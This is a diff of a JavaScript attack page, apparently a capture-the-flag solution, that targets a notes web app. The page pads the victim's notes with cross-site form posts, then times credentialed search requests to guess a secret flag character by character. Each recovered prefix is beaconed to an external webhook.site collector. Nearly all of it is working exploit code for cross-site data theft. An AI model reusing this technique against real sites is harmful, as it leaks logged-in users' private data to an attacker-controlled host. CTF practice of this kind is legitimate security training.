@@ -1,18 +1,25 @@
 <!doctype html><html><body><iframe name="sink" style="display:none"></iframe><script>
-const TARGET='https://localhost:3000', COLLECT='https://fc292c75-abf9-4b3b-8f3a-1c988a6eab86.webhook.site/log', NID=1;
-const WORDS=Array(5000).fill('qq').join(' '), PREFIX='inctf{';
+const TARGET='https://localhost:3000', COLLECT='https://072a2e57-4133-4c8f-8808-14ed9048b91e.webhook.site/log', NID=1;
+const WORDS=Array(5000).fill('qq').join(' '), KNOWN0='inctf{QtgWOabbgFQ553a1cl';
 const CS="_abcdefghijklmnopqrstuvwxyz0123456789{}-!?.@$#ABCDEFGHIJKLMNOPQRSTUVWXYZ".split('');
 function log(k,v){new Image().src=COLLECT+'?'+k+'='+encodeURIComponent(v)+'&t='+Date.now();}
 function addF(){return new Promise(r=>{let d=false;const fin=()=>{if(!d){d=true;r();}};const f=document.createElement('form');f.method='POST';f.action=TARGET+'/notes/'+NID+'/subnotes';f.enctype='text/plain';f.target='sink';const i=document.createElement('input');i.name='{"content":"';i.value=' '+WORDS+'"}';f.appendChild(i);document.body.appendChild(f);const s=document.getElementsByName('sink')[0];s.onload=fin;f.submit();setTimeout(fin,2000);});}
-async function tq(q,n){let b=Infinity;for(let i=0;i<(n||2);i++){const t0=performance.now();try{await fetch(TARGET+'/notes/search?q='+encodeURIComponent(q),{mode:'no-cors',credentials:'include',cache:'no-store'});}catch(e){}const dt=performance.now()-t0;if(dt<b)b=dt;}return b;}
+async function tq(q,n){let b=Infinity;for(let i=0;i<(n||3);i++){const t0=performance.now();try{await fetch(TARGET+'/notes/search?q='+encodeURIComponent(q),{mode:'no-cors',credentials:'include',cache:'no-store'});}catch(e){}const dt=performance.now()-t0;if(dt<b)b=dt;}return b;}
 async function run(){
- log('D','ext_start');
- for(let i=0;i<20;i++){await addF();}
- const sl=Math.round(await tq(PREFIX,3)), fa=Math.round(await tq('zzqzqzx',3));
+ log('D','cont_start');
+ for(let i=0;i<5;i++){await addF();}            // top up amplification a bit
+ // recalibrate on warmed code; fa=nonmatch baseline
+ const sl=Math.round(await tq(KNOWN0,4)), fa=Math.round(await tq('zzqzqzx',4));
  log('calib','sl='+sl+' fa='+fa);
- const thr=Math.max(40,(sl+fa)/2);
- let k=PREFIX; log('known',k);
- for(let p=0;p<60;p++){let f=null;for(const c of CS){if(await tq(k+c,2)>thr){f=c;break;}}if(f===null){log('D','stuck_'+k);break;}k+=f;log('known',k);if(f==='}'){log('FLAG',k);break;}}
+ const thr=fa+Math.max(25,(sl-fa)*0.30);        // adaptive, low enough to survive JIT drift
+ let k=KNOWN0; log('known',k);
+ for(let p=0;p<50;p++){
+   let f=null;
+   for(const c of CS){ if(await tq(k+c,3)>thr){ f=c; break; } }
+   if(f===null){ log('D','stuck_'+k); break; }
+   k+=f; log('known',k);
+   if(f==='}'){ log('FLAG',k); break; }
+ }
  log('D','done_'+k);
 }
 run();
